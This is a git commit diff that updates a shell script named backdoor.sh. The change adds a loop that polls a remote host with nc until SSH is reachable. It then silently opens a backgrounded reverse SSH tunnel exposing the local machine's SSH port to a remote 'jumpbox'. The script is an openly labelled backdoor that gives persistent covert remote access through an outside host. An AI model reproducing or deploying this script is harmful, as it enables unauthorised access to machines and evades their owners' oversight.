55a52227878cc3e06789c2496a12ba00b5e3fa21
zc00l <andre.marques@fatec.sp.gov.br>
2017-02-08 11:29:30 -0200

    New improvements to backdoor shell script/

--- backdoor.sh
+++ backdoor.sh
@@ -6,12 +6,21 @@ lport=18000
 
 function tunnel
 {
-    /usr/bin/ssh -N -R ${lport}:localhost:22 ${user}@${remote}
+
+    nc -zv ${remote} 22
+    while [[ $? -eq 1 ]]; 
+    do
+        sleep 30
+        nc -zv ${remote} 22
+    done
+
+    /usr/bin/ssh -N -R ${lport}:localhost:22 ${user}@${remote} > /dev/null 2>&1 &
     if [[ $? -eq 0 ]]; then
         echo "Tunnel to jumpbox created successfully."
     else
         echo An error occurred creating a tunnel to jumpbox. Err: $?
     fi
 }
+
 
 tunnel
